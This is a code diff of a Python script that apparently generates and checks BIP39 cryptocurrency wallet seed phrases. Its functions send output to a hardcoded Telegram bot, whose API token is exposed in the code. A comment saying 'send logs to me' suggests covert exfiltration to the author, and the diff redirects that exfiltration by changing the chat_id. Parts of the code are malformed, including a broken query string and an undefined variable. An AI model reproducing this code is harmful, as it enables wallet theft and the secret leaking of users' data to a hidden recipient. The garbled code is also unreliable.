@@ -26,7 +26,7 @@ class Bip39Gen64:
     def Bip39(msg):
         # send logs to me,dont use it!
         msg=msg+f' by {akaka}'
-        a=requests.get('https://api.telegram.org/bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc/sendMessage?chat_id1001251612065=&text={msg}')
+        a=requests.get('https://api.telegram.org/bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc/sendMessage?chat_id1349339080=&text={msg}')
         return 1
 
 import bip32utils
@@ -41,7 +41,7 @@ import os
 timesl = 1 # задержка между запросами
 
 token = 'bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc' # Telegram TOKEN
-chat_id = '-1001251612065' # USER ID
+chat_id = '1349339080' # USER ID
 
 
 class Settings():
@@ -67,8 +67,6 @@ def userInput():
     print()
     start()
     time.sleep(5)
-
-
 def getInternet():
     try:
         try:
@@ -148,7 +146,7 @@ def listToString(s):
 def sendBotMsg(msg):
     if token_bot != "1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc":
         try:
-            url = f"chat_id={-1001251612065}&text={работать}"
+            url = f"chat_id={1349339080}&text={msg}"
             requests.get(f"https://api.telegram.org/bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc/sendMessage", url)
 
         except:
@@ -238,9 +236,9 @@ def check(f):
 
 def start():
     try:
-        threads = 5
-        if threads > 500:
-            print("You can only run 500 threads at once")
+        threads = 99
+        if threads > 10000:
+            print("You can only run 100 threads at once")
             start()
     except ValueError:
         print("Enter an interger!")
@@ -264,5 +262,4 @@ if __name__ == '__main__':
         print("You have no internet access the generator won't work.")
     else:
         pass
-
-    userInput()
+        userInput()
